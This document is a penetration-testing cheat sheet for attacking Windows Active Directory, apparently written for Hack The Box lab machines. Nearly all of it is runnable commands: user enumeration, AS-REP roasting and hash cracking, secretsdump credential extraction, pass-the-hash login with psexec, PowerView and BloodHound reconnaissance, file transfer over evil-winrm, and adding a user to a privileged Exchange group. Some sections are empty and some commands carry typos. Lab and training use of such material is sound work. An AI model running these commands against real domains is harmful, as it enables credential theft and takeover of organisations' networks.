# Tools

## Kerbrute

Identify potential valid users

```bash
kerbrute userenum --dc <IP> -d <domain.local> users.txt
# Can verify working by placing known users in user.txt i.e. administrato, guest,

```

## Impacket

#### GetADUsers

```bash
```

#### GetNPUsers

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

```bash
GetNPUsers.py <DOMAIN.LOCAL>/administrator  # use other known usernames too
# Look for user/hash output

GetNPUsers.py -dc-ip <IP> -request 'htb.local/'
# Look for user/hash output
GetNPUsers.py -dc-ip <IP> -request 'htb.local/' -format hashcat  # Put it in hashcat format in prep to crack
# Hashcat Crack
hashcat -m 18200 hash.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule
# If cracked...
crackmapexec smb <IP> -u <user> -p <password>  # Look for Pwn3d!
crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares to access
```

#### GetUserSPNs

```bash
```

#### secretsdump

```bash
secretsdump.py htb.local/<username>@<IP>
secretsdump.py htb.local/<username>:<password>@<IP>
# Grab the hashes then attempt to crack or pass the hash
# Pass the hash
crackmapexec smb <IP> -u administrator -H <hash>
# If Pwn3d!...
psexec.py -hashes <hash> administrator@<IP>
```

## PowerView

Cheat Sheet - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Setup

```powershell
# Navigate to the directory PowerView is in
powershell -ep bypass  # load a powershell shell with execution policy bypassed
. .\PowerView.ps1  # import the PowerView module
```

### Example

```powershell
Get-NetComputer -fulldata | select operatingsystem  # gets a list of all operating systems on the domain
Get-NetUser | select cn  # gets a list of all users on the domain
Get-NetGroup  # Get groups
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable user from a specified group
```

## evil-winrm

#### Upload File to Target

```bash
# From compromised target
Evil-WinRM PS C:\Users\FSmith\Documents> upload winPEAS.exe
Evil-WinRM PS C:\Users\FSmith\Documents> .\winPEAS.exe
```

#### Download From from Target

```bash
# From compromised target
Evil-WinRM PS C:\Users\FSmith\Documents> download 123_BloodHound.zip
```

## Bloodhound / Sharphound

### Sharphound

Copy sharphound.exe to the target and run to gather information.

```powershell
.\SharpHound.exe -c all
# Will output a zip file to copy back to Kali
```

### Bloodhound

Run Bloodhound (and neo4j) then import zip file created by Sharphound

```bash
# Run neo4j first
sudo neo4j console
# Run Bloodhound
bloodhound --no-sandbox

# After importing, search on what you have owned
# Ex: search on username, right click and mark as owned
# Then navigate to Queries and look at Shortest Paths
# Look at Service accounts/Account Operators which have special permissions create accounts and put htem in different groups
# Ex: Create new user and add them to a group that has higher permissions; can't be Administrator gourp
net user <username> <password> /add/ domain
net group "Exchange Windows Permissions"  # Check for group members
net group "Exchange Windows Permissions" /add <username>  # Add user to group in quotes
# Then back in Bloodhound, right click group added (graph line) and look at Abuse Info.
# Will most likely use PowerView for the Abuse
```

### neo4j

```bash
# neo4j new password/forgot password
locate no4j | grep auth
rm /usr/share/neo4j/data/dbms/auth
neo4j console
# Reset password
```

